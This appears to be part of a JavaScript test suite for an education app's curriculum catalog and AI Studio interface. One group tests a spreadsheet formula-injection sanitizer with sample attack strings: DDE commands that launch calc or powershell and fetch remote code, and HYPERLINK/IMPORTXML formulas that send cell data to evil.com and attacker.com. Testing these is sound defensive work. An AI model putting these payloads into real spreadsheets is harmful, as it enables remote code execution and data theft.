    const histCount = disciplines.filter(d => d === 'History').length;
    const geoCount = disciplines.filter(d => d === 'Geography').length;
    const civCount = disciplines.filter(d => d === 'Civics').length;
    const econCount = disciplines.filter(d => d === 'Economics').length;

    assert.strictEqual(histCount, 5, 'Class 10 must have 5 History chapters');
    assert.strictEqual(geoCount, 7, 'Class 10 must have 7 Geography chapters');
    assert.strictEqual(civCount, 5, 'Class 10 must have 5 Civics chapters');
    assert.strictEqual(econCount, 5, 'Class 10 must have 5 Economics chapters');

    for (let i = 0; i < 5; i++) assert.strictEqual(disciplines[i], 'History');
    for (let i = 5; i < 12; i++) assert.strictEqual(disciplines[i], 'Geography');
    for (let i = 12; i < 17; i++) assert.strictEqual(disciplines[i], 'Civics');
    for (let i = 17; i < 22; i++) assert.strictEqual(disciplines[i], 'Economics');
  });

  test('T-EMP-3.5: Sorting stability under adversarial shuffle: reverses and random orders are correctly sorted', () => {
    const { gasSandbox, ss } = createGasBackendSandbox();
    const origClass9Soc = catalogDataModule.getCanonicalCatalog('Class 9', 'Social Science');
    // Deliberately reverse the array
    const reversed = [...origClass9Soc].reverse();

    // Seed the reversed array into Table 16 in spreadsheet
    const sheet = ss.getSheetByName('CurriculumCatalog');
    const matrix = catalogDataModule.toTable16Matrix(reversed);
    sheet.getRange(2, 1, matrix.length, matrix[0].length).setValues(matrix);

    // Now query through getCurriculumCatalog
    const res = gasSandbox.getCurriculumCatalog({ grade: 'Class 9', subject: 'Social Science', forceRefresh: true });
    assert.strictEqual(res.count, 20);

    // Verify it restored exact canonical order: History -> Geo -> Civ -> Econ
    const disciplines = res.items.map(i => i.subSubject || (i.chapterTitle.split(':')[0].trim()));
    for (let i = 0; i < 5; i++) assert.strictEqual(disciplines[i], 'History', `Expected History at ${i}`);
    for (let i = 5; i < 11; i++) assert.strictEqual(disciplines[i], 'Geography', `Expected Geography at ${i}`);
    for (let i = 11; i < 16; i++) assert.strictEqual(disciplines[i], 'Civics', `Expected Civics at ${i}`);
    for (let i = 16; i < 20; i++) assert.strictEqual(disciplines[i], 'Economics', `Expected Economics at ${i}`);
  });

  test('T-EMP-3.6: Monotonic chapter numbering within each sub-discipline has zero inversions', () => {
    const { gasSandbox } = createGasBackendSandbox();
    ['Class 7', 'Class 8', 'Class 9', 'Class 10'].forEach(g => {
      const res = gasSandbox.getCurriculumCatalog(g, 'Social Science');
      let currentDisc = '';
      let lastChNum = 0;

      res.items.forEach(item => {
        const disc = item.subSubject || (item.chapterTitle.split(':')[0].trim());
        if (disc !== currentDisc) {
          currentDisc = disc;
          lastChNum = item.chapterNumber;
          assert.strictEqual(item.chapterNumber, 1, `First chapter of ${disc} in ${g} must be 1`);
        } else {
          assert.strictEqual(item.chapterNumber, lastChNum + 1, `Chapter number inversion in ${disc} ${g}: ${item.chapterNumber} after ${lastChNum}`);
          lastChNum = item.chapterNumber;
        }
      });
    });
  });

});

describe('Group 4: CWE-1236 Formula Injection Neutralization on Extreme Attack Strings', () => {

  test('T-EMP-4.1: Direct formula prefixes (=, +, -, @, \\t, \\r) are prepended with single quote', () => {
    const { gasSandbox } = createGasBackendSandbox();
    const sanitize = gasSandbox.sanitizeSheetCellValue;

    assert.strictEqual(sanitize('=cmd|\' /C calc\'!A0'), '\'=cmd|\' /C calc\'!A0');
    assert.strictEqual(sanitize('+1+1'), '\'+1+1');
    assert.strictEqual(sanitize('-2+3'), '\'-2+3');
    assert.strictEqual(sanitize('@SUM(1,1)'), '\'@SUM(1,1)');
    assert.strictEqual(sanitize('\t=cmd'), '\'\t=cmd');
    assert.strictEqual(sanitize('\r+SUM(1,1)'), '\'\r+SUM(1,1)');
  });

  test('T-EMP-4.2: Extreme DDE, calc, and URL exfiltration attacks are neutralized', () => {
    const { gasSandbox } = createGasBackendSandbox();
    const sanitize = gasSandbox.sanitizeSheetCellValue;

    const extremeAttacks = [
      '=1+2+cmd|\' /C calc\'!A0',
      '+HYPERLINK("http://evil.com/leak?d="&A1, "Click Here")',
      '-2+5+cmd|\' /C powershell -enc JAB... \'!A0',
      '@IMPORTXML("http://attacker.com/steal?data="&CONCATENATE(A1:A50), "//a")',
      '=cmd|\'/C powershell IEX(New-Object Net.WebClient).DownloadString("http://evil.com/p")\'!A0'
    ];

    extremeAttacks.forEach(attack => {
      const result = sanitize(attack);
      assert.ok(result.startsWith("'"), `Attack must start with single quote: ${attack}`);
      assert.strictEqual(result, "'" + attack);
    });
  });

  test('T-EMP-4.3: Leading whitespace with formula prefix is safely sanitized', () => {
    const { gasSandbox } = createGasBackendSandbox();
    const sanitize = gasSandbox.sanitizeSheetCellValue;

    const whitespaceAttacks = [
      '   =1+1',
      '     +cmd',
      ' \t -HYPERLINK("http://evil.com")',
      '  @SUM(A1:B10)'
    ];

    whitespaceAttacks.forEach(wa => {
      const result = sanitize(wa);
      assert.ok(result.startsWith("'"), `Leading whitespace attack must be quoted: ${wa}`);
    });
  });

  test('T-EMP-4.4: CWE-1236 Sanitization is strictly idempotent (no double quoting)', () => {
    const { gasSandbox } = createGasBackendSandbox();
    const sanitize = gasSandbox.sanitizeSheetCellValue;

    const alreadyQuoted = [
      "'=cmd",
      "'+1+1",
      "'-2+3",
      "'@SUM(1,1)",
      "Normal Chapter Title",
      "Chapter 1: The World Around Us"
    ];

    alreadyQuoted.forEach(q => {
      const sanitizedOnce = sanitize(q);
      const sanitizedTwice = sanitize(sanitizedOnce);
      assert.strictEqual(sanitizedOnce, q, `Already safe string must not be altered: ${q}`);
      assert.strictEqual(sanitizedTwice, q, `Sanitizing twice must not introduce double quotes: ${q}`);
    });
  });

  test('T-EMP-4.5: Non-string values (numbers, booleans, null, undefined) are preserved unmodified', () => {
    const { gasSandbox } = createGasBackendSandbox();
    const sanitize = gasSandbox.sanitizeSheetCellValue;

    assert.strictEqual(sanitize(123), 123);
    assert.strictEqual(sanitize(0), 0);
    assert.strictEqual(sanitize(-5), -5);
    assert.strictEqual(sanitize(3.14159), 3.14159);
    assert.strictEqual(sanitize(true), true);
    assert.strictEqual(sanitize(false), false);
    assert.strictEqual(sanitize(null), null);
    assert.strictEqual(sanitize(undefined), undefined);
  });

  test('T-EMP-4.6: Seeding adversarial catalog data into spreadsheet quotes all cells safely', () => {
    const { gasSandbox, ss } = createGasBackendSandbox();

    // Create adversarial catalog items
    const maliciousItems = [
      {
        id: 'cat_adv_01',
        grade: 'Class 5',
        subject: 'Mathematics',
        chapterNumber: 1,
        chapterTitle: '=cmd|\' /C calc\'!A0',
        topicsJson: '["=ALERT(1)", "+cmd|/C evil"]',
        learningObjectivesJson: '["@IMPORTXML(\'http://evil.com\')"]'
      }
    ];

    // Seed using gasSandbox
    gasSandbox.CANONICAL_CURRICULUM_CATALOG = maliciousItems;
    const seedRes = gasSandbox.seedCurriculumCatalog({ adminUserId: 'u_adm_emp', reset: true });
    assert.strictEqual(seedRes.success, true);

    const sheet = ss.getSheetByName('CurriculumCatalog');
    const rows = sheet.getRange(2, 1, 1, 7).getValues();
    const seededRow = rows[0];

    // Check chapterTitle
    assert.ok(seededRow[4].startsWith("'="), `chapterTitle was not sanitized: ${seededRow[4]}`);
    // Check topicsJson
    assert.ok(typeof seededRow[5] === 'string');
    // Check learningObjectivesJson
    assert.ok(typeof seededRow[6] === 'string');
  });

});

describe('Group 5: Admin AI Studio Dynamic Class/Subject Switching UI Interactions', () => {

  test('T-EMP-5.1: Switching #aiGenGrade dynamically repopulates #aiGenChapterSelect', async () => {
    const { sandbox, domElements } = createStudioSandbox();

    domElements['aiGenGrade'].value = 'Class 7';
    domElements['aiGenSubject'].value = 'Science';
    sandbox.handleAiGenGradeOrSubjectChange();
    await new Promise(r => setTimeout(r, 15));

    const chapterSelect = domElements['aiGenChapterSelect'];
    assert.ok(chapterSelect.options.length > 2, `Options must be populated, got ${chapterSelect.options.length}`);
    // Class 7 Science has 13 chapters + 1 placeholder + 1 custom = 15 options
    assert.strictEqual(chapterSelect.options.length, 15);
    assert.ok(domElements['aiGenChapterCountBadge'].textContent.includes('13 Chapters Available'));
  });

  test('T-EMP-5.2: Switching #aiGenSubject dynamically repopulates #aiGenChapterSelect', async () => {
    const { sandbox, domElements } = createStudioSandbox();

    domElements['aiGenGrade'].value = 'Class 10';
    domElements['aiGenSubject'].value = 'English';
    sandbox.handleAiGenGradeOrSubjectChange();
    await new Promise(r => setTimeout(r, 15));

    const chapterSelect = domElements['aiGenChapterSelect'];
    // Class 10 English has 9 chapters + 1 placeholder + 1 custom = 11 options
    assert.strictEqual(chapterSelect.options.length, 11);
    assert.strictEqual(chapterSelect.value, 'A Letter to God & Dust of Snow & Fire and Ice');
    assert.strictEqual(domElements['aiGenChapter'].value, 'A Letter to God & Dust of Snow & Fire and Ice');
  });

  test('T-EMP-5.3: Switching to unsupported grade/subject combination cleanly switches to custom manual mode', async () => {
    const { sandbox, domElements } = createStudioSandbox();

    // Class 1 Science does not exist in NCERT primary curriculum
    domElements['aiGenGrade'].value = 'Class 1';
    domElements['aiGenSubject'].value = 'Science';
    sandbox.handleAiGenGradeOrSubjectChange();
    await new Promise(r => setTimeout(r, 15));

    const chapterSelect = domElements['aiGenChapterSelect'];
    assert.strictEqual(domElements['aiGenChapterCountBadge'].textContent, '0 Chapters Available');
    // Verify mode switched to custom
    assert.ok(domElements['aiGenChapterDropdownWrapper'].classList.contains('hidden'));
    assert.ok(!domElements['aiGenChapterInputWrapper'].classList.contains('hidden'));
    assert.strictEqual(domElements['aiGenChapterModeBadge'].textContent, 'Custom Manual');
  });

  test('T-EMP-5.4: Value synchronization: selecting dropdown option immediately updates #aiGenChapter', async () => {
    const { sandbox, domElements } = createStudioSandbox();

    domElements['aiGenGrade'].value = 'Class 3';
    domElements['aiGenSubject'].value = 'Mathematics';
    sandbox.handleAiGenGradeOrSubjectChange();
    await new Promise(r => setTimeout(r, 15));

    const chapterSelect = domElements['aiGenChapterSelect'];
    chapterSelect.value = 'Toy Joy';
    sandbox.handleAiGenChapterSelectChange('Toy Joy');

    assert.strictEqual(domElements['aiGenChapter'].value, 'Toy Joy');
    assert.strictEqual(domElements['aiGenChapterModeBadge'].textContent, 'CBSE Catalog');
  });

  test('T-EMP-5.5: High-frequency sequential switching leaves zero DOM corruption', async () => {
    const { sandbox, domElements } = createStudioSandbox();

    const sequence = [
      { g: 'Class 1', s: 'Mathematics', count: 13 },
      { g: 'Class 5', s: 'EVS', count: 22 },
      { g: 'Class 8', s: 'Social Science', count: 21 },
      { g: 'Class 10', s: 'Science', count: 13 },
      { g: 'Class 3', s: 'Hindi', count: 18 }
    ];

    for (const { g, s, count } of sequence) {
      domElements['aiGenGrade'].value = g;
      domElements['aiGenSubject'].value = s;
      sandbox.handleAiGenGradeOrSubjectChange();
      await new Promise(r => setTimeout(r, 15));

      const chapterSelect = domElements['aiGenChapterSelect'];
      // count + 2 (placeholder + custom)
      assert.strictEqual(chapterSelect.options.length, count + 2, `Options count mismatch for ${g} - ${s}`);
      assert.ok(domElements['aiGenChapterCountBadge'].textContent.includes(`${count} Chapters Available`));
      assert.ok(chapterSelect.value.length > 0, `First chapter not selected for ${g} - ${s}`);
    }
  });

});

describe('Group 6: Dynamic Mode Toggling, Topic Datalist & Suggestion Pills', () => {

  test('T-EMP-6.1: Selecting __CUSTOM__ option triggers manual input mode and hides dropdown', async () => {
    const { sandbox, domElements } = createStudioSandbox();

    domElements['aiGenGrade'].value = 'Class 3';
    domElements['aiGenSubject'].value = 'Mathematics';
    sandbox.handleAiGenGradeOrSubjectChange();
    await new Promise(r => setTimeout(r, 15));

    sandbox.handleAiGenChapterSelectChange('__CUSTOM__');

    assert.ok(domElements['aiGenChapterDropdownWrapper'].classList.contains('hidden'));
    assert.ok(!domElements['aiGenChapterInputWrapper'].classList.contains('hidden'));
    assert.strictEqual(domElements['aiGenChapterModeBadge'].textContent, 'Custom Manual');
    assert.ok(domElements['aiGenTopicPillsContainer'].innerHTML.includes('Manual mode'));
  });

  test('T-EMP-6.2: Clicking #aiGenChapterModeToggleBtn toggles bidirectionally between Dropdown and Custom', async () => {
    const { sandbox, domElements } = createStudioSandbox();

    domElements['aiGenGrade'].value = 'Class 4';
    domElements['aiGenSubject'].value = 'Mathematics';
    sandbox.handleAiGenGradeOrSubjectChange();
    await new Promise(r => setTimeout(r, 15));

    // Default mode: Dropdown
    assert.ok(!domElements['aiGenChapterDropdownWrapper'].classList.contains('hidden'));
    assert.strictEqual(domElements['aiGenChapterModeBadge'].textContent, 'CBSE Catalog');

    // Click toggle to switch to Custom
    sandbox.toggleAiGenChapterMode();
    assert.ok(domElements['aiGenChapterDropdownWrapper'].classList.contains('hidden'));
    assert.ok(!domElements['aiGenChapterInputWrapper'].classList.contains('hidden'));
    assert.strictEqual(domElements['aiGenChapterModeBadge'].textContent, 'Custom Manual');
    assert.strictEqual(domElements['aiGenChapterModeToggleText'].textContent, 'Official Syllabus');

    // Click toggle again to switch back to Dropdown
    sandbox.toggleAiGenChapterMode();
    assert.ok(!domElements['aiGenChapterDropdownWrapper'].classList.contains('hidden'));
    assert.ok(domElements['aiGenChapterInputWrapper'].classList.contains('hidden'));
    assert.strictEqual(domElements['aiGenChapterModeBadge'].textContent, 'CBSE Catalog');
    assert.strictEqual(domElements['aiGenChapterModeToggleText'].textContent, 'Custom / Manual');
  });

  test('T-EMP-6.3: Typing authentic chapter in manual mode auto-detects and selects option', async () => {
    const { sandbox, domElements } = createStudioSandbox();

    domElements['aiGenGrade'].value = 'Class 3';
    domElements['aiGenSubject'].value = 'Mathematics';
    sandbox.handleAiGenGradeOrSubjectChange();
    await new Promise(r => setTimeout(r, 15));

    sandbox.toggleAiGenChapterMode('custom');
    domElements['aiGenChapter'].value = 'double century';
    sandbox.handleAiGenChapterManualInput('double century');

    assert.strictEqual(domElements['aiGenChapterSelect'].value, 'Double Century');
  });

  test('T-EMP-6.4: Selecting a chapter automatically populates <datalist id="aiGenTopicDatalist">', async () => {
    const { sandbox, domElements } = createStudioSandbox();

    domElements['aiGenGrade'].value = 'Class 3';
    domElements['aiGenSubject'].value = 'Mathematics';
    sandbox.handleAiGenGradeOrSubjectChange();
    await new Promise(r => setTimeout(r, 15));

    sandbox.handleAiGenChapterSelectChange('Double Century');

    const datalist = domElements['aiGenTopicDatalist'];
    assert.ok(datalist.options && datalist.options.length > 0, 'Datalist options must be populated');
    const optionValues = datalist.options.map(o => o.value);
    assert.ok(optionValues.some(v => v.includes('Number Line Jumps') || v.includes('Cricket Score') || v.includes('Estimation')), 'Expected topic in datalist');
  });

  test('T-EMP-6.5: Primary topic auto-fill populates #aiGenTopic on chapter selection', async () => {
    const { sandbox, domElements } = createStudioSandbox();

    domElements['aiGenGrade'].value = 'Class 5';
    domElements['aiGenSubject'].value = 'Mathematics';
    sandbox.handleAiGenGradeOrSubjectChange();
    await new Promise(r => setTimeout(r, 15));

    sandbox.handleAiGenChapterSelectChange('The Fish Tale');

    const topicInput = domElements['aiGenTopic'];
    assert.ok(topicInput.value.length > 0, '#aiGenTopic must be auto-filled');
    assert.ok(topicInput.value.includes('Large Numbers') || topicInput.value.includes('Place Value'));
  });

  test('T-EMP-6.6: Clicking topic pills updates #aiGenTopic and shifts active styling', async () => {
    const { sandbox, domElements } = createStudioSandbox();

    domElements['aiGenGrade'].value = 'Class 3';
    domElements['aiGenSubject'].value = 'Mathematics';
    sandbox.handleAiGenGradeOrSubjectChange();
    await new Promise(r => setTimeout(r, 15));

    sandbox.handleAiGenChapterSelectChange('Toy Joy');

    const pillsContainer = domElements['aiGenTopicPillsContainer'];
    const buttons = pillsContainer.querySelectorAll('button');
    assert.ok(buttons.length >= 2, 'Must have at least 2 topic pills');

    // Click the second button
    const targetTopicText = buttons[1].textContent.replace('💡', '').trim();
    buttons[1].click();

    assert.strictEqual(domElements['aiGenTopic'].value, targetTopicText);
    assert.ok(buttons[1].className.includes('border-[#09293D]'), 'Active button must have border-[#09293D]');
  });

  test('T-EMP-6.7: Custom mode or empty chapter renders informative message without throwing', () => {
    const { sandbox, domElements } = createStudioSandbox();

    sandbox.handleAiGenChapterSelectChange('');
    assert.strictEqual(domElements['aiGenChapter'].value, '');
    assert.strictEqual(domElements['aiGenTopicPillsContainer'].innerHTML, '');

    sandbox.updateAiGenTopicSuggestions([]);
    assert.ok(domElements['aiGenTopicPillsContainer'].innerHTML.includes('No preset topics'));
  });

});

describe('Group 7: Strict Brand Guidelines (Universal 0px Border-Radius Compliance)', () => {

  const FORBIDDEN_ROUNDED_REGEX = /\brounded-(sm|md|lg|xl|2xl|3xl|full)\b/;

  test('T-EMP-7.1: #aiGenChapterSelect strictly adheres to rounded-none and has 0 non-zero rounded classes', () => {
    const { domElements } = createStudioSandbox();
    const select = domElements['aiGenChapterSelect'];
    assert.ok(select.className.includes('rounded-none'), 'Must include rounded-none');
    assert.ok(!FORBIDDEN_ROUNDED_REGEX.test(select.className), `Forbidden rounded class in ${select.className}`);
  });

  test('T-EMP-7.2: #aiGenChapter input strictly adheres to rounded-none and has 0 non-zero rounded classes', () => {
    const { domElements } = createStudioSandbox();
    const input = domElements['aiGenChapter'];
    assert.ok(input.className.includes('rounded-none'), 'Must include rounded-none');
    assert.ok(!FORBIDDEN_ROUNDED_REGEX.test(input.className), `Forbidden rounded class in ${input.className}`);
  });

  test('T-EMP-7.3: #aiGenChapterModeBadge strictly adheres to rounded-none and has 0 non-zero rounded classes', () => {
    const { domElements } = createStudioSandbox();
    const badge = domElements['aiGenChapterModeBadge'];
    assert.ok(badge.className.includes('rounded-none'), 'Must include rounded-none');
    assert.ok(!FORBIDDEN_ROUNDED_REGEX.test(badge.className), `Forbidden rounded class in ${badge.className}`);
  });

  test('T-EMP-7.4: #aiGenChapterModeToggleBtn strictly adheres to rounded-none and has 0 non-zero rounded classes', () => {
    const { domElements } = createStudioSandbox();
    const btn = domElements['aiGenChapterModeToggleBtn'];
    assert.ok(btn.className.includes('rounded-none'), 'Must include rounded-none');
    assert.ok(!FORBIDDEN_ROUNDED_REGEX.test(btn.className), `Forbidden rounded class in ${btn.className}`);
  });

  test('T-EMP-7.5: #aiGenTopic input strictly adheres to rounded-none and has 0 non-zero rounded classes', () => {
    const { domElements } = createStudioSandbox();
    const input = domElements['aiGenTopic'];
    assert.ok(input.className.includes('rounded-none'), 'Must include rounded-none');
    assert.ok(!FORBIDDEN_ROUNDED_REGEX.test(input.className), `Forbidden rounded class in ${input.className}`);
  });

  test('T-EMP-7.6: Dynamic topic suggestion pills rendered in container strictly enforce rounded-none', async () => {
    const { sandbox, domElements } = createStudioSandbox();
    domElements['aiGenGrade'].value = 'Class 8';
    domElements['aiGenSubject'].value = 'Science';
    sandbox.handleAiGenGradeOrSubjectChange();
    await new Promise(r => setTimeout(r, 15));

    const pillsContainer = domElements['aiGenTopicPillsContainer'];
    const buttons = pillsContainer.querySelectorAll('button');
    assert.ok(buttons.length > 0);

    buttons.forEach((btn, idx) => {
      assert.ok(btn.className.includes('rounded-none'), `Pill ${idx} missing rounded-none: ${btn.className}`);
      assert.ok(!FORBIDDEN_ROUNDED_REGEX.test(btn.className), `Pill ${idx} contains forbidden rounded class: ${btn.className}`);
    });
  });

  test('T-EMP-7.7: HTML source scan of all AI Studio chapter/topic elements confirms zero non-zero rounded tokens', () => {
    const containerMatch = htmlSource.match(/<div id="aiGenChapterContainer"[\s\S]*?<\/div>\s*<\/div>\s*<\/div>/i);
    assert.ok(containerMatch, 'aiGenChapterContainer section must be present in HTML');

    const sectionHtml = containerMatch[0];
    const forbiddenMatches = sectionHtml.match(/\brounded-(sm|md|lg|xl|2xl|3xl|full)\b/g);
    assert.strictEqual(forbiddenMatches, null, `Forbidden rounded tokens found in HTML studio section: ${forbiddenMatches}`);
  });

});

// -------------------------------------------------------------------------
// Standalone CLI Runner Execution Hook
// -------------------------------------------------------------------------
if (require.main === module) {
  registry.run({ verbose: true }).then(({ stats }) => {
    process.exit(stats.failed > 0 ? 1 : 0);
  });
}
